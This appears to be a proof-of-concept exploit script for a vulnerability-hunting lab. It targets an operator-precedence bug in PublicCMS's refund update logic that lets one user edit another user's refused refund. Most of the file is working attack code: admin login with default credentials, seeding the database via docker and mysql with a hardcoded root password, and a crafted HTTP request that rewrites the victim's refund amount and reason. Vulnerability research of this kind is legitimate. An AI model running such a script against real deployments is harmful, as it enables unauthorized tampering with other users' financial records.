#!/usr/bin/env bash
# VULN-009 — IDOR in refund updateAmound via operator-precedence bug
#
# TradeRefundService.updateAmound guard:
#   if (null != entity && entity.getUserId() == userId && entity.getStatus() == STATUS_PENDING
#           || entity.getStatus() == STATUS_REFUSE) { ...edit... }
# Java binds && tighter than ||, so it parses as (A && owner && PENDING) || (status==REFUSE).
# When the target refund's status is STATUS_REFUSE(3), the whole condition is true REGARDLESS of
# userId -> a cross-user edit. (Nonexistent id: left group short-circuits, right operand deref
# on null -> abnormal termination.)
#
# Reached via TradePaymentController.refund update branch: pendingRefund(paymentId) must pass first
# (so paymentId points to a PAID payment), then updateAmound(refundId, attacker, amount, reason).
#
# Precondition seeding (no gateway configured): a PAID payment + a victim-owned REFUSE refund are
# inserted directly. The EXPLOIT is the HTTP cross-user edit.
#
# CONFIRMED when the victim's REFUSE refund is edited by the attacker (amount+reason changed,
# status reset to PENDING) while its owner (user_id) stays the victim.
#
# DESTRUCTIVE (edits a refund). Fresh victim/attacker/payment/refund per run.
set -u
BASE_URL="${BASE_URL:-http://localhost:20000}"
VHOST="${VHOST:-site2.dev.publiccms.com}"
ADMIN_USER="${ADMIN_USER:-admin}"; ADMIN_PASS="${ADMIN_PASS:-admin}"
MYSQL_CONTAINER="${MYSQL_CONTAINER:-cvehunt_PublicCMS_mysql}"
DBQ(){ docker exec "$MYSQL_CONTAINER" mysql -uroot -pRootPass2026 publiccms -N -e "$1" 2>/dev/null | tr -d '\r'; }
OUT="$(cd "$(dirname "$0")" && pwd)"
S="$(tr -dc 'a-z0-9' </dev/urandom | head -c 8)"
PID=$(( 910000000 + (RANDOM<<8) + RANDOM % 256 )); RID=$(( 920000000 + (RANDOM<<8) + RANDOM % 256 ))

echo "[INFO] VULN-009: cross-user edit of a REFUSE refund via operator-precedence bug"
AC=$(curl -s -D - -o /dev/null -H "Host: $VHOST" --data "username=${ADMIN_USER}&password=${ADMIN_PASS}" \
     "$BASE_URL/admin/login" | grep -i 'set-cookie: PUBLICCMS_ADMIN' | cut -d= -f2 | cut -d';' -f1); ACSRF="${AC#*_}"
[ -z "$AC" ] && { echo "[FAIL] no admin session"; exit 1; }
mkuser(){ curl -s -o /dev/null -H "Host: $VHOST" -b "PUBLICCMS_ADMIN=$AC" --data-urlencode "_csrf=$ACSRF" \
  --data-urlencode "name=$1" --data-urlencode "nickname=$1" --data-urlencode "password=Passw0rd!23" \
  --data-urlencode "repassword=Passw0rd!23" --data-urlencode "contentPermissions=0" "$BASE_URL/admin/sysUser/save"; \
  DBQ "SELECT id FROM sys_user WHERE name='$1';"; }
VICTIM=$(mkuser "vref_$S"); ATTACKER=$(mkuser "aref_$S")

echo "[SETUP] seeding PAID payment $PID + victim(id=$VICTIM) REFUSE refund $RID (no gateway -> direct seed)"
DBQ "INSERT INTO trade_payment (id,site_id,user_id,amount,trade_type,serial_number,account_type,ip,status,processed,create_date) VALUES ($PID,2,$VICTIM,50.00,'grade','$PID','alipay','127.0.0.1',1,0,NOW());"
DBQ "INSERT INTO trade_refund (id,site_id,payment_id,user_id,amount,reason,status,create_date) VALUES ($RID,2,$PID,$VICTIM,50.00,'orig_reason_$S',3,NOW());"
BEFORE=$(DBQ "SELECT CONCAT('owner=',user_id,' amount=',amount,' reason=',reason,' status=',status) FROM trade_refund WHERE id=$RID;")
echo "[SETUP] refund BEFORE: $BEFORE (status 3=REFUSE)"

UC=$(curl -s -D - -o /dev/null -H "Host: $VHOST" --data-urlencode "username=aref_$S" --data-urlencode "password=Passw0rd!23" \
     --data-urlencode "returnUrl=/" "$BASE_URL/doLogin" | grep -i 'set-cookie: PUBLICCMS_USER' | cut -d= -f2 | cut -d';' -f1); UCSRF="${UC#*_}"

echo "[STEP] attacker(id=$ATTACKER) edits victim's REFUSE refund: id=$RID paymentId=$PID amount=999 reason=PWNED"
curl -s -o /dev/null -w '[INFO] HTTP %{http_code}\n' -H "Host: $VHOST" -b "PUBLICCMS_USER=$UC" \
  --data-urlencode "_csrf=$UCSRF" --data-urlencode "id=$RID" --data-urlencode "paymentId=$PID" \
  --data-urlencode "amount=999.00" --data-urlencode "reason=PWNED_$S" --data-urlencode "returnUrl=/" "$BASE_URL/tradePayment/refund"
AFTER=$(DBQ "SELECT CONCAT('owner=',user_id,' amount=',amount,' reason=',reason,' status=',status) FROM trade_refund WHERE id=$RID;")
AMT=$(DBQ "SELECT amount FROM trade_refund WHERE id=$RID;"); RSN=$(DBQ "SELECT reason FROM trade_refund WHERE id=$RID;"); OWN=$(DBQ "SELECT user_id FROM trade_refund WHERE id=$RID;"); ST=$(DBQ "SELECT status FROM trade_refund WHERE id=$RID;")
{ echo "refund $RID BEFORE: $BEFORE"; echo "refund $RID AFTER : $AFTER"; } > "$OUT/response.txt"
echo "[INFO] refund AFTER: $AFTER"

if [ "$AMT" = "999.00" ] && [ "$RSN" = "PWNED_$S" ] && [ "$OWN" = "$VICTIM" ] && [ "$ST" = "0" ]; then
  echo "[OK] exploit confirmed — attacker(id=$ATTACKER) edited victim(id=$VICTIM)'s REFUSE refund (amount/reason changed, status 3->0)"
  exit 0
else
  echo "[FAIL] cross-user refund edit not observed"; exit 1
fi
# cleanup hint: DELETE FROM trade_refund WHERE reason LIKE 'PWNED_%' OR reason LIKE 'orig_reason_%'; DELETE FROM trade_payment WHERE serial_number REGEXP '^9[12]';
